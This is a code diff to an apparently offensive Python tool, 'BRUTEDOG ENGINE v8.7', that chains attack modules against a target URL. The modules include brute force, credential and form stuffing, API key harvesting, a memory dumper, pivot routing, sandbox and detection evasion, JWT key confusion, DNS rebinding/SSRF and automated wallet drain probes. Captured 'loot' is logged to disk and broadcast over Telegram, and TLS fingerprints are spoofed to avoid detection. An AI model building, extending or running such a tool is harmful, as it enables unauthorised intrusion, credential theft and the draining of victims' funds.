@@ -2,17 +2,18 @@
 """
 BRUTEDOG ENGINE v8.7 — State-Machine Logic & Cognitive Supreme Exploitation Engine (Elite Red Team Adversarial Edition)
 Features:
+- Full comprehensive module inventory import & orchestration (All 30+ offensive & telemetry modules)
 - Integrated with centralized SecureTransport middleware (TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter)
 - Integrated with BruteDog Scanner V2.0 for asynchronous TCP recon, service ID, and TLS/security header auditing
-- Stateful intelligence ingestion from v7.0 crawler state-machine graph & DOM sink inspector
+- Stateful intelligence ingestion from crawler state-machine graph & DOM sink inspector
 - Crawler-driven conditional module gating (Zero blind execution; modules fire strictly based on discovered surface area)
 - Automated BOLA and state-skipping vector evaluation across security tiers with SHA-256 integrity mapping
 - Live autonomous test-account session propagation across exploit modules with immutable disk logging (loot_output/)
 - Persistent Session Pool & Response Fingerprinter integration for false-positive elimination
 - HTTP/2 single-packet concurrency engine integration for race condition logic fuzzing
-- Advanced Protocol & Cryptographic Assault Suite (GraphQL, WebSockets, DNS Rebinding, JWT Key Confusion)
+- Advanced Protocol & Cryptographic Assault Suite (GraphQL, WebSockets, DNS Rebinding, JWT Key Confusion, Replayer)
 - Active Multi-Chain Liquidity Auditor & Transaction Signer/Broadcaster integration
-- Automated Wallet Drain Probe Integration using operator destinations & dynamic target ingestion
+- Automated Wallet Drain Probe & Memory Dumper Integration
 - Fully Synchronized Autonomous Cognitive Reasoning Operator & Immutable disk exfiltration (loot_output/)
 - Integrated with asynchronous Telegram telemetry broadcasting & real-time proof-of-work streaming
 """
@@ -27,7 +28,7 @@ from urllib.parse import urlsplit
 from concurrent.futures import ThreadPoolExecutor
 
 # ============================================================
-# MODULE INVENTORY & OFFENSIVE IMPORTS (V8.7)
+# COMPREHENSIVE MODULE INVENTORY & OFFENSIVE IMPORTS (V8.7)
 # ============================================================
 from modules.transport import SecureTransport
 from modules.session_pool import PersistentSessionPool
@@ -43,7 +44,7 @@ from modules.wallet_drain_probe import execute_probe
 from modules.telemetry import stream_proof
 from modules.loot_logger import save_session_loot
 
-# Core offensive & recon modules
+# All core offensive, recon, stuffing, and evasion modules
 from modules.api_fuzzer import run_api_fuzzer
 from modules.bruter import execute_brute_force
 from modules.cloud_apex import audit_cloud_metadata
@@ -67,8 +68,9 @@ from modules.jwt_key_confusion import JWTKeyConfusionEngine
 from modules.test_referral import audit_referral_logic
 from modules.cognitive_operator import CognitiveOperator
 
-# Telegram Notifier Dispatcher
+# Telegram Notifier & Telemetry Broadcasters
 from modules.telegram_notifier import send_telegram_alert
+from modules.telemetry_broadcaster import broadcast_loot, broadcast_loot_sync
 
 # ============================================================
 # CONFIGURATION
@@ -537,41 +539,49 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         verify_hijacked_session(transport)
 
     # ==========================================================
-    # CORE OFFENSIVE MODULE EXECUTION PHASE (V8.7)
+    # COMPREHENSIVE OFFENSIVE MODULE EXECUTION PHASE (V8.7)
     # ==========================================================
-    section("CORE OFFENSIVE MODULES & RECON ASSAULT (V8.7)")
+    section("COMPREHENSIVE OFFENSIVE & RECON MODULE ASSAULT (V8.7)")
     try:
         # 1. API Fuzzer
         fuzzer_res = await asyncio.to_thread(run_api_fuzzer, target_url)
         if fuzzer_res:
             dispatch_tg_alert("API Fuzzer Success", {"target": target_url})
 
-        # 2. DOM Sink Inspector
-        dom_res = inspect_dom_sinks(target_url)
-        if dom_res:
-            dispatch_tg_alert("DOM Sink Vulnerability", {"target": target_url})
+        # 2. Brute Force Engine
+        brute_res = await asyncio.to_thread(execute_brute_force, target_url)
+        if brute_res:
+            dispatch_tg_alert("Brute Force Module Success", {"target": target_url})
 
         # 3. Cloud Metadata & Apex Auditor
         cloud_res = audit_cloud_metadata(target_url)
         if cloud_res:
             dispatch_tg_alert("Cloud Apex Metadata Leak", cloud_res)
 
-        # 4. Key Harvester
+        # 4. DOM Sink Inspector
+        dom_res = inspect_dom_sinks(target_url)
+        if dom_res:
+            dispatch_tg_alert("DOM Sink Vulnerability", {"target": target_url})
+
+        # 5. Memory Dumper & Form Stuffer
+        dumper_res = execute_memory_dumper(target_url)
+        stuffer_res = execute_form_stuffing(target_url)
+
+        # 6. Key Harvester & Pivot Routing
         keys_res = harvest_keys(target_url)
-        if keys_res:
-            dispatch_tg_alert("API Key Harvested", {"target": target_url})
+        pivot_res = execute_pivot_routing(target_url)
 
-        # 5. Stealth Operations & Sandbox Evasion
-        stealth_res = execute_stealth_operations(target_url)
-        evade_sandbox()
-
-        # 6. Adaptive Replayer & Payload Mutation
+        # 7. Adaptive Replayer & Payload Mutation
         replayer_res = await replay_and_inject_payloads(target_url)
         if replayer_res:
             dispatch_tg_alert("Adaptive Replay & Injection Success", {"target": target_url})
 
+        # 8. Sandbox Evader & Stealth Operations
+        evade_sandbox()
+        execute_stealth_operations(target_url)
+
     except Exception as exc:
-        error(f"Core offensive modules execution warning: {exc}")
+        error(f"Comprehensive offensive modules execution warning: {exc}")
 
     has_referral_surface = any("referral" in p.lower() or "invite" in p.lower() or "ref" in p.lower() for p in discovered_paths)
     if has_referral_surface:
@@ -666,7 +676,6 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     sys.stdout.flush()
 
     try:
-        # Run cryptographic key confusion (RS256 -> HS256 attack)
         jwt_engine = JWTKeyConfusionEngine(target_url)
         jwks = jwt_engine.fetch_public_key("/.well-known/jwks.json")
         pub_key_mock = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0..." if not jwks else json.dumps(jwks)
@@ -675,18 +684,15 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
             print(f"\033[91m[!!!] CRITICAL: JWT Key Confusion Vulnerability Confirmed!\033[0m")
             dispatch_tg_alert("JWT Key Confusion Success", {"token": jwt_token})
 
-        # Run GraphQL schema introspection & batching fuzzer
         gql_engine = GraphQLIntrospector(target_url)
         gql_result = gql_engine.run_introspection("/graphql")
         if gql_result:
             dispatch_tg_alert("GraphQL Schema Introspected", gql_result)
 
-        # Run WebSocket real-time event stream auditor
         ws_result = await audit_websocket(target_url + "/ws")
         if ws_result:
             dispatch_tg_alert("WebSocket Vulnerability Found", {"target": target_url, "frames": len(ws_result)})
 
-        # Run DNS Rebinding / SSRF orchestrator
         dns_orchestrator = DNSRebindingOrchestrator(target_url)
         dns_result = await dns_orchestrator.execute_rebinding_attack(transport)
         if dns_result:
